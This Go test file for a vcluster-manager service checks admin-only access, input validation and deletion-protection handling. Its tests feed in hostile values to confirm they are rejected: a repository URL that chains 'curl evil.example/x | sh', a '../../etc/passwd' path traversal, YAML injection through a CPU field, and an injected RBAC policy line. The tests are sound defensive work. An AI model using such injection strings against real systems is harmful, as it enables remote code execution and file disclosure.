package service

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"

	"github.com/gmalfray/vcluster-manager/internal/kubernetes"
	"github.com/gmalfray/vcluster-manager/internal/models"

	"k8s.io/apimachinery/pkg/runtime"
	clienttesting "k8s.io/client-go/testing"
)

func TestValidName(t *testing.T) {
	tests := []struct {
		name string
		want bool
	}{
		{"demo", true},
		{"demo-2", true},
		{"a", true},
		{"", false},
		{"Demo", false},
		{"1demo", false},
		{"-demo", false},
		{"../etc", false},
		{"demo/evil", false},
		{"demo evil", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ValidName(tt.name); got != tt.want {
				t.Errorf("ValidName(%q) = %v, want %v", tt.name, got, tt.want)
			}
		})
	}
}

// --- Create: RBAC and field validation --------------------------------
//
// These all return before Create touches s.parser/s.gitlab, so a zero-value
// Service (built through newTestService, no GitLab/parser wired) is enough to
// reach them.

func TestCreate_ForbiddenForNonAdmin(t *testing.T) {
	s := newTestService()
	_, err := s.Create(context.Background(), models.Actor{Username: "bob", IsAdmin: false}, &models.CreateRequest{Name: "demo"}, "both")
	if !errors.Is(err, ErrForbidden) {
		t.Fatalf("expected ErrForbidden for non-admin, got %v", err)
	}
}

func TestCreate_RejectsInvalidName(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{Name: "Not_Valid!"}, "both")
	if !errors.Is(err, ErrInvalidName) {
		t.Fatalf("expected ErrInvalidName, got %v", err)
	}
}

func TestCreate_RejectsMalformedCPU(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{Name: "demo", CPU: "8\n  evil: true"}, "both")
	if err == nil || !strings.Contains(err.Error(), "cpu :") {
		t.Fatalf("expected a cpu validation error, got %v", err)
	}
}

func TestCreate_RejectsShellInjectionInFluxRepoURL(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{
		Name:          "demo",
		FluxCDRepoURL: "ssh://git@host/repo.git && curl evil.example/x | sh",
	}, "both")
	if err == nil || !strings.Contains(err.Error(), "fluxcd_repo_url :") {
		t.Fatalf("expected a fluxcd_repo_url validation error, got %v", err)
	}
}

func TestCreate_RejectsPathTraversalInFluxCDPath(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{
		Name:       "demo",
		FluxCDPath: "../../etc/passwd",
	}, "both")
	if err == nil || !strings.Contains(err.Error(), "fluxcd_path :") {
		t.Fatalf("expected a fluxcd_path validation error, got %v", err)
	}
}

func TestCreate_RejectsMalformedVeleroHour(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{
		Name:       "demo",
		VeleroHour: "25:99",
	}, "both")
	if err == nil || !strings.Contains(err.Error(), "velero_hour :") {
		t.Fatalf("expected a velero_hour validation error, got %v", err)
	}
}

func TestCreate_EmptyScopeDefaultsToBoth(t *testing.T) {
	// Field validation must run regardless of scope, including when scope
	// defaults from "" to "both" — proof the default is applied before
	// validation, not after.
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{Name: "Not_Valid!"}, "")
	if !errors.Is(err, ErrInvalidName) {
		t.Fatalf("expected ErrInvalidName even with an empty scope, got %v", err)
	}
}

// --- Delete / GetDeleteConfirm: RBAC ------------------------------------

func TestDelete_ForbiddenForNonAdmin(t *testing.T) {
	s := newTestService()
	_, err := s.Delete(context.Background(), models.Actor{Username: "bob", IsAdmin: false}, "demo", DeleteInput{Env: "preprod"})
	if !errors.Is(err, ErrForbidden) {
		t.Fatalf("expected ErrForbidden for non-admin, got %v", err)
	}
}

func TestGetDeleteConfirm_ForbiddenForNonAdmin(t *testing.T) {
	s := newTestService()
	_, err := s.GetDeleteConfirm(context.Background(), models.Actor{Username: "bob", IsAdmin: false}, "demo", "preprod")
	if !errors.Is(err, ErrForbidden) {
		t.Fatalf("expected ErrForbidden for non-admin, got %v", err)
	}
}

// --- GetDeleteConfirm / PerformDeletion: namespace protection ----------
//
// GetNamespaceProtection now returns (bool, error), so both call sites in
// this file have to decide what "the read failed" means for them. These
// tests exercise that decision, not RBAC or the GitOps side of deletion.

func TestGetDeleteConfirm_ShowsProtectionWhenReadSucceeds(t *testing.T) {
	cfg := newTestConfig(t)
	var mu sync.RWMutex
	s := newDashboardTestService(t, newFakeGitLab(), &mu, cfg)
	s.k8sClients["preprod"] = kubernetes.NewTestStatusClient(
		unstructuredNamespace("demo", map[string]string{"protect-deletion": "true"}))

	data, err := s.GetDeleteConfirm(context.Background(), adminActor(), "demo", "preprod")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !data.ProtectionEnabled {
		t.Fatal("expected ProtectionEnabled=true, the annotation is set and the read succeeded")
	}
}

// A failed read is display-only here — GetDeleteConfirm doesn't gate on it —
// but it must not come back looking like an affirmative "not protected", and
// it must not fail the whole confirmation page either.
func TestGetDeleteConfirm_ReadFailureDoesNotFailThePage(t *testing.T) {
	cfg := newTestConfig(t)
	var mu sync.RWMutex
	s := newDashboardTestService(t, newFakeGitLab(), &mu, cfg)
	s.k8sClients["preprod"] = kubernetes.NewTestStatusClientWithReactor(func(action clienttesting.Action) (bool, runtime.Object, error) {
		if action.GetVerb() == "get" && action.GetResource().Resource == "namespaces" {
			return true, nil, errors.New("api server unreachable")
		}
		return false, nil, nil
	}, unstructuredNamespace("demo", map[string]string{"protect-deletion": "true"}))

	data, err := s.GetDeleteConfirm(context.Background(), adminActor(), "demo", "preprod")
	if err != nil {
		t.Fatalf("a namespace-protection read failure must not fail the whole confirmation page: %v", err)
	}
	if data.Name != "demo" || data.Env != "preprod" {
		t.Fatalf("expected the rest of the page data to still be filled in, got %+v", data)
	}
}

// The annotation blocks FluxCD from actually removing the namespace (see the
// comment on PerformDeletion), so lifting it on a guess would be wrong the
// other way round too: SetNamespaceProtection must only run once we've
// confirmed the annotation is there.
func TestPerformDeletion_ClearsProtectionWhenConfirmedSet(t *testing.T) {
	cfg := newTestConfig(t)
	var mu sync.RWMutex
	s := newDashboardTestService(t, newFakeGitLab(), &mu, cfg)
	k8s := kubernetes.NewTestStatusClient(unstructuredNamespace("demo", map[string]string{"protect-deletion": "true"}))
	s.k8sClients["preprod"] = k8s

	s.PerformDeletion(context.Background(), "demo", true, false, false, false)

	protected, err := k8s.GetNamespaceProtection(context.Background(), "demo")
	if err != nil {
		t.Fatalf("unexpected error reading back the annotation: %v", err)
	}
	if protected {
		t.Fatal("expected the protect-deletion annotation to be lifted")
	}
}

// A read that fails on the way in must not be treated as "not protected": that
// would clear an annotation we never actually confirmed was there, on nothing
// more than an API hiccup. Skipping the clear leaves the namespace protected —
// the safe direction — for a future delete attempt to sort out.
func TestPerformDeletion_LeavesProtectionUntouchedOnReadFailure(t *testing.T) {
	cfg := newTestConfig(t)
	var mu sync.RWMutex
	s := newDashboardTestService(t, newFakeGitLab(), &mu, cfg)

	var namespaceGets int
	k8s := kubernetes.NewTestStatusClientWithReactor(func(action clienttesting.Action) (bool, runtime.Object, error) {
		if action.GetVerb() != "get" || action.GetResource().Resource != "namespaces" {
			return false, nil, nil
		}
		namespaceGets++
		if namespaceGets == 1 {
			// Only the very first read (PerformDeletion's own check) fails; the
			// verification read below must see the real, untouched state.
			return true, nil, errors.New("api server unreachable")
		}
		return false, nil, nil
	}, unstructuredNamespace("demo", map[string]string{"protect-deletion": "true"}))
	s.k8sClients["preprod"] = k8s

	s.PerformDeletion(context.Background(), "demo", true, false, false, false)

	protected, err := k8s.GetNamespaceProtection(context.Background(), "demo")
	if err != nil {
		t.Fatalf("unexpected error reading back the annotation: %v", err)
	}
	if !protected {
		t.Fatal("a failed read must not have cleared the protect-deletion annotation")
	}
}

// Complements the two tests above: it isn't enough that the annotation ends
// up unprotected, PerformDeletion must not even attempt to write it when the
// read already says there's nothing to lift. Otherwise "only lift a
// confirmed protection" degrades into "call SetNamespaceProtection every
// time and let it be a no-op" — which happens to look the same when the
// write itself never fails, but stops being true the moment it does.
func TestPerformDeletion_DoesNotWriteWhenAlreadyUnprotected(t *testing.T) {
	cfg := newTestConfig(t)
	var mu sync.RWMutex
	s := newDashboardTestService(t, newFakeGitLab(), &mu, cfg)

	var namespaceUpdates int
	k8s := kubernetes.NewTestStatusClientWithReactor(func(action clienttesting.Action) (bool, runtime.Object, error) {
		if action.GetVerb() == "update" && action.GetResource().Resource == "namespaces" {
			namespaceUpdates++
		}
		return false, nil, nil
	}, unstructuredNamespace("demo", nil))
	s.k8sClients["preprod"] = k8s

	s.PerformDeletion(context.Background(), "demo", true, false, false, false)

	if namespaceUpdates != 0 {
		t.Fatalf("expected no write to the namespace, the annotation was never set (got %d update(s))", namespaceUpdates)
	}
}

// --- sentinel errors: Is()/Unwrap() ------------------------------------

func TestExistsError_Is(t *testing.T) {
	err := error(&ExistsError{Name: "demo", Env: "prod"})
	if !errors.Is(err, ErrVClusterExists) {
		t.Fatalf("expected ExistsError to match ErrVClusterExists via errors.Is")
	}
	if errors.Is(err, ErrCleaningInProgress) {
		t.Fatalf("ExistsError must not match an unrelated sentinel")
	}
}

func TestVClusterNotFoundError_IsAndUnwrap(t *testing.T) {
	underlying := errors.New("file not found")
	err := error(&VClusterNotFoundError{Err: underlying})
	if !errors.Is(err, ErrVClusterNotFound) {
		t.Fatalf("expected VClusterNotFoundError to match ErrVClusterNotFound via errors.Is")
	}
	if !errors.Is(err, underlying) {
		t.Fatalf("expected VClusterNotFoundError to unwrap to the underlying error")
	}
}

func TestCleaningError_Is(t *testing.T) {
	err := error(&CleaningError{Name: "demo", Env: "preprod"})
	if !errors.Is(err, ErrCleaningInProgress) {
		t.Fatalf("expected CleaningError to match ErrCleaningInProgress via errors.Is")
	}
}

func TestUnpairError_Unwrap(t *testing.T) {
	underlying := errors.New("rancher 500")
	err := error(&UnpairError{Err: underlying})
	if !errors.Is(err, underlying) {
		t.Fatalf("expected UnpairError to unwrap to the underlying error")
	}
}

func TestCommitError_Unwrap(t *testing.T) {
	underlying := errors.New("gitlab 500")
	err := error(&CommitError{Err: underlying})
	if !errors.Is(err, underlying) {
		t.Fatalf("expected CommitError to unwrap to the underlying error")
	}
}

// --- field validators (direct, package-private) -------------------------

func TestValidateQuantity(t *testing.T) {
	tests := []struct {
		value string
		want  bool
	}{
		{"", true},
		{"8", true},
		{"500m", true},
		{"32Gi", true},
		{"8\n  evil: true", false},
		{"not-a-quantity", false},
	}
	for _, tt := range tests {
		t.Run(tt.value, func(t *testing.T) {
			err := validateQuantity("cpu", tt.value)
			if (err == nil) != tt.want {
				t.Errorf("validateQuantity(%q) error = %v, want valid=%v", tt.value, err, tt.want)
			}
		})
	}
}

func TestValidateVeleroHour(t *testing.T) {
	tests := []struct {
		value string
		want  bool
	}{
		{"", true},
		{"03:00", true},
		{"23:59", true},
		{"25:99", false},
		{"3am", false},
	}
	for _, tt := range tests {
		t.Run(tt.value, func(t *testing.T) {
			err := validateVeleroHour("velero_hour", tt.value)
			if (err == nil) != tt.want {
				t.Errorf("validateVeleroHour(%q) error = %v, want valid=%v", tt.value, err, tt.want)
			}
		})
	}
}

// Create doit passer par validName et non par nameRegex seul : la forme du nom
// ne suffit pas, il faut aussi écarter celui dont le namespace dérivé retombe
// sur celui de l'opérateur. C'est le chemin qu'emprunte l'UI, qui ne passe pas
// par l'admission de l'API server et ne bénéficie donc pas de la règle CEL.
func TestCreate_RejectsTheNameThatResolvesToTheOperatorNamespace(t *testing.T) {
	s := newTestService()
	nom := strings.TrimPrefix(OperatorNamespace, "vcluster-")

	_, err := s.Create(context.Background(), adminActor(), &models.CreateRequest{Name: nom}, "both")
	if !errors.Is(err, ErrInvalidName) {
		t.Fatalf("err = %v, attendu ErrInvalidName : un vcluster nommé %q ferait de %q sa cible, "+
			"c'est-à-dire le namespace de l'app", err, nom, OperatorNamespace)
	}
}

// Un groupe RBAC hostile doit être refusé à la création, pas rendu.
func TestCreate_RejectsAnUnrenderableRBACGroup(t *testing.T) {
	s := newTestService()

	_, err := s.Create(context.Background(), adminActor(), &models.CreateRequest{
		Name:       "injection",
		RBACGroups: []string{"team\n    p, role:x, applications, *, */*, allow"},
	}, "both")
	if !errors.Is(err, ErrInvalidRBACGroup) {
		t.Fatalf("err = %v, attendu ErrInvalidRBACGroup", err)
	}
}
